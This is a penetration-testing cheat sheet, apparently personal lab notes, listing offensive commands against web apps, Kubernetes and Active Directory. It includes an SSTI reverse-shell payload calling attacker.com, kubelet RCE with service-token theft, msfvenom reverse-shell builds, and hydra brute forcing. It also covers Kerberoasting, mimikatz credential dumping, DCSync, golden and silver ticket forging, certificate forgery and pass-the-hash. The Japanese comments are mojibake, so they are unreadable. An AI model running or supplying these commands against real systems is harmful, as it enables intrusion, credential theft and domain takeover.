<!-- MarkdownTOC -->

- SSTI \(Server-Side Template Injection\)
- port scan
- kubeletctl
- ffuf
- sqlmap
- Powershell
- powershell_download_file
- enum4linux
- bloodhound
- rpcclient
- ldapsearch
- wpscan
- nikto
- hydra
- icacls
- vaultcmd
- cmdkey
- RunAs
- smbclient
- msfvenom
- impacket
	- impacket-GetNPUsers
	- impacket-GetUserSPNs
	- impacket-secretsdump
	- impakcet-psexec
- kekeo
- Invoke-Mimikatz
- mimikatz
- ForgeCert
- Rubeus
- NTDS Util
- evil-winrm
- DCSync
- xfreerdp
- hashcat
- python
- bash
- 

<!-- /MarkdownTOC -->
# SSTI (Server-Side Template Injection)
```shell
{{config.__class__.__init__.__globals__['os'].popen('/bin/bash -c "bash -i >& /dev/tcp/attacker.com/8080 0>&1"').read()}}
```

# port scan
```shell
# nmap
ports=$(sudo nmap -sS -Pn -p- --min-rate=1000 -T4 10.10.11.130 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) && sudo nmap -sS -Pn -T4 -p$ports -sV -sC 10.10.11.130

# bash
for PORT in {0..65536}; do timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
```

# kubeletctl
```shell

# Pod���В�
kubeletctl --server 10.10.11.133 pods

# RCE���ܤ�Pod�Υ������
kubeletctl --server 10.10.11.133 scan rce
��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
��                                   Node with pods vulnerable to RCE                                  ��
���������Щ����������������������������Щ������������������������������������������������������������������������Щ��������������������������Щ��������������������������������������������������Щ�����������
��   �� NODE IP      �� PODS                               �� NAMESPACE   �� CONTAINERS              �� RCE ��
���������੤���������������������������੤�����������������������������������������������������������������������੤�������������������������੤�������������������������������������������������੤����������
��   ��              ��                                    ��             ��                         �� RUN ��
���������੤���������������������������੤�����������������������������������������������������������������������੤�������������������������੤�������������������������������������������������੤����������
�� 1 �� 10.10.11.133 �� kube-scheduler-steamcloud          �� kube-system �� kube-scheduler          �� -   ��
���������੤���������������������������੤�����������������������������������������������������������������������੤�������������������������੤�������������������������������������������������੤����������
�� 2 ��              �� etcd-steamcloud                    �� kube-system �� etcd                    �� -   ��
���������੤���������������������������੤�����������������������������������������������������������������������੤�������������������������੤�������������������������������������������������੤����������
�� 3 ��              �� kube-apiserver-steamcloud          �� kube-system �� kube-apiserver          �� -   ��
���������੤���������������������������੤�����������������������������������������������������������������������੤�������������������������੤�������������������������������������������������੤����������
�� 4 ��              �� storage-provisioner                �� kube-system �� storage-provisioner     �� -   ��
���������੤���������������������������੤�����������������������������������������������������������������������੤�������������������������੤�������������������������������������������������੤����������
�� 5 ��              �� kube-proxy-6s86w                   �� kube-system �� kube-proxy              �� +   ��
���������੤���������������������������੤�����������������������������������������������������������������������੤�������������������������੤�������������������������������������������������੤����������
�� 6 ��              �� coredns-78fcd69978-7tc4p           �� kube-system �� coredns                 �� -   ��
���������੤���������������������������੤�����������������������������������������������������������������������੤�������������������������੤�������������������������������������������������੤����������
�� 7 ��              �� nginx                              �� default     �� nginx                   �� +   ��
���������੤���������������������������੤�����������������������������������������������������������������������੤�������������������������੤�������������������������������������������������੤����������
�� 8 ��              �� kube-controller-manager-steamcloud �� kube-system �� kube-controller-manager �� -   ��
���������ة����������������������������ة������������������������������������������������������������������������ة��������������������������ة��������������������������������������������������ة�����������


# RCE -p: Pod name -c: Container name
kubeletctl --server 10.10.11.133 exec "id" -p nginx -c nginx

# �ȩ`������^������ȡ��
kubeletctl --server 10.10.11.133 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx
kubeletctl --server 10.10.11.133 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx

# ���ɥե����������
cat f.yaml

apiVersion: v1
kind: Pod
metadata:
  name: nginxt
  namespace: default
spec:
  containers:
  - name: nginxt
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true

# �ȩ`������^������ʹ�ä�pod��ȡ��
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:8443 get pods

# ���ޤδ_�J
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:8443 auth can-i --list

# ����Τ���pod������
kubectl --token=$token --certificate-authority=ca.cert --server=https://10.10.11.133:8443 apply -f f.yaml

# ���ɤǤ������_�J
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:8443 get pods
```

# ffuf
```shell
# ���֥ɥᥤ����В�
ffuf -t 200 -u http://devvortex.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -H 'Host: FUZZ.devvortex.htb' -fw 4

# �֥�`�ȥե��`��
ffuf -request r.txt -request-proto http -w /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASSFUZZ -mc 200 -t 200
```

# sqlmap
```shell
sqlmap -r req.txt --current-user --batch

```

# Powershell
```shell
# ��`����׷��
Add-ADGroupMember "IT Support" -Members "Your.AD.Account.Username"

# ��`���Η���
Get-ADGroupMember -Identity "IT Support"

# ��`�����������륰��`��
Get-ADPrincipalGroupMembership -Identity fsmith | Select-Object Name
```

# powershell_download_file
```shell
powershell "(new-object system.net.webclient).downloadfile('http://attackerIP:PORT/exploit.exe','exploit.exe'"
```

# enum4linux
```shell
enum4linux IP

# ���Ԕ�����В�
enum4linux -a IP
enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>
```
# bloodhound
```shell
# Remote
bloodhound-python -u <UserName> -p <Password> -ns <Domain Controller Ip> -d <Domain> -c All --zip

# On site

.\SharpHound.exe --CollectionMethod All --LdapUsername <UserName> --LdapPassword <Password> --domain <Domain> --domaincontroller <Domain Controller Ip> --OutputDirectory <PathToFile>

#Using PowerShell module ingestor
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All --LdapUsername <UserName> --LdapPassword <Password> --OutputDirectory <PathToFile>

```

# rpcclient
```shell
rpcclient -U "" -N 10.200.16.100
```

# ldapsearch
```shell
ldapserach -x -H ldap://dc-ip-here -s base namingcontexts
ldapsearch -LLL -x -H ldap://10.200.16.100 -b '' -s base '(objectclass=*)'
```

# wpscan
```shell
wpscan --url IP

# ��`���В�
wpscan --url IP --enumerate u

# ȫ�В�
wpscan --url URL -e

wpscan --url URL -U admin -P /usr/share/wordlists/rockyou.txt
```

# nikto
```shell
nikto --url IP_ADDRESS | tee nikto-results
```

# hydra
```shell
hydra -l USERNAME -p PASSWORD IPADDRESS ftp
hydra -L USERLIST -P PASSLIST ssh://IPADDRESS
hydra -l USERNAME -P PASSLIST http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Login:wrongPASS' -f -V
hydra -L USERLIST -p password IPADDRESS http-get '/:A=NTLM:F=401'
```

# icacls
```bat
icacls
```
# vaultcmd
```bat
rem�����椵��Ƥ����Y�������В� 
vaultcmd /list

rem Web Credentials Vault�˱��椵��Ƥ����Y����󤬤��뤫�_�J
vaultcmd /listproperties:"Web Credentials"

rem ���椵��Ƥ����Y������Ԕ����_�J
vaultcmd /listcreds:"Web Credentials"
```

# cmdkey
```bat
cmdkey /list
```

# RunAs
```bat
runas /savecred /user:THM.red\thm-local cmd.exe
```

# smbclient
```shell
# �ӾA
smbclient //10.10.10.10/sharename -U username -p port
smbclient -U "username" \\\\domain.local\\sharename

# �В�
smbclient -L 10.10.215.171
smbclient -U "svc-admin" -L domain.local

# �������`�ɤǤ����Τ�ȫ�ƥ������`��
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
```

# msfvenom
```shell
msfvenom -p linux/x64/shell_reverse_tcp lhost=10.8.109.203 lport=1234 -f elf -o exploit.elf
msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.8.109.203 lport=1234 -f sh -o exploit.sh
```

# impacket
## impacket-GetNPUsers
```shell
# Kerberos��ǰ�J�^���Ҫ�Ȥ��ʤ��O���ˤʤäƤ���AD��`���Υѥ���`�ɥϥå���ȡ��
impacket-GetNPUsers spookysec.local/ -dc-ip 10.10.10.10 -usersfile usernames.txt -format hashcat -outputfile hashes.txt
impacket-GetNPUsers spookysec.local/backup -no-pass -dc-ip 10.10.10.10
```

## impacket-GetUserSPNs
```shell
impacket-GetUserSPNs -dc-ip 10.10.10.10 spookysec.local/thm:"Password\!"
impakcet-GetUserSPNs -dc-ip 10.10.10.10 spookysec.local/thm:"Password\!" -request-user svc-user
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast
```

## impacket-secretsdump
```shell
impacket-secretsdump -security path/to/security -system path/to/system -ntds path/to/ntds.dit
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
impakcet-secretsdump spookysec.local\backup:password123@spookysec.local
```

## impakcet-psexec
```shell
impacket-psexec Administrator:@spookysec.local -hashes 0e363213e37b94221497260b0bcb4fc
```

# kekeo
```bat
rem ���`�ӥ��Υ����å�����
kekeo # tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password
```

# Invoke-Mimikatz
```shell
import-module .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"lsadump::dcsync /user:Administrator"'
Invoke-Mimikatz -Command '"lsadump::dcsync /all"'
```

# mimikatz
```bat
rem lsa���o��o���ˤ���ɥ饤�Ф򥤥�ݩ`�Ȥ��Ɵo����
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove

rem SeDebugPrivilege���ޤ��Є��ˤ��ƤߤƬF�ڤΘ��ޤ�_�J
mimikatz # privilege::debug

rem ���
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::credman

rem SYSTEM��`���ؤΤʤꤹ�ޤ�
mimikatz # token::elevate

rem �쥸���ȥ�ϥ��֤����Y������ƽ�Ĥ�ȡ��
mimikatz # lsadump::secrets

rem �g�Х���ȡ�����O��
mimikatz # log dcdump.txt

rem DCͬ�ڤ����ä��ƥϥå�������
mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all

rem ���`��ǥ�����åȂ���
mimikatz # kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt

rem ����Щ`�����åȂ���
mimikatz # kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /target:thmserver1.za.tryhackme.loc /rc4:16f9af38fca3ada405386b3b57366082 /service:cifs /ptt

rem DC�˱��椵��Ƥ����^�����Υ����å�
mimikatz # crypto::certificates /systemstore:local_machine 
rem Exportable key: NO���O������Ƥ����Ϥ��i���z��ѥå�
mimikatz # privilege::debug
mimikatz # crypto::capi
mimikatz # crypto::cng
rem �^�������`�Υ������ݩ`��
mimikatz # crypto::certificates /systemstore:local_machine /export
```

# ForgeCert
```bat
rem �������ݩ`�Ȥ����^������ʹ�äƄe���^��������
ForgeCert.exe --CaCertPath local_machine_My_0_.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123
```

# Rubeus
```bat
rem ���ä��^������ʹ�ä�TGT�ꥯ����������
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:fulladmin.pfx /password:Password123 /outfile:fulladmin.kirbi /domain:za.tryhackme.loc /dc:10.200.61.101
```

# NTDS Util
```bat
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```

# evil-winrm
```shell
# login
evil-winrm -u user -p password -i 10.10.10.10

# PtH
evil-winrm -u user -H 0e363213e37b94221497260b0bcb4fc -i 10.10.10.10

menu
Bypass-4MSI
```

# DCSync
```shell
$pass = convertto-securestring 'password' -asplain -force
$cred = new-object system.management.automation.pscredential('htb\user', $pass)
add-objectACL -principalidentity user -credential $cred -rights DCSync
```

# xfreerdp
```shell
# login
xfreerdp /u:user /p:password /v:10.10.10.10 +clipboard /size:1920x1080

# PtH
xfreerdp /u:user /H:0e363213e37b94221497260b0bcb4fc /v:10.10.10.10 +clipboard /size:1920x1080

# connect to windows 7
xfreerdp /u:admin /p:password /v:10.10.174.238 /dynamic-resolution /cert:ignore /workarea /tls-seclevel:0
```

# hashcat
[hash example](https://hashcat.net/wiki/doku.php?id=example_hashes)
```shell
# �Ǖ�����
hashcat -m 1400 -a 0 hash.txt password.lst

# �֥�`�ȥե��`��
hashcat -m 1400 -a 3 hash.txt
```

# python
```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

# bash
```shell
# ������ΰ�����
/bin/bash -i
```

# 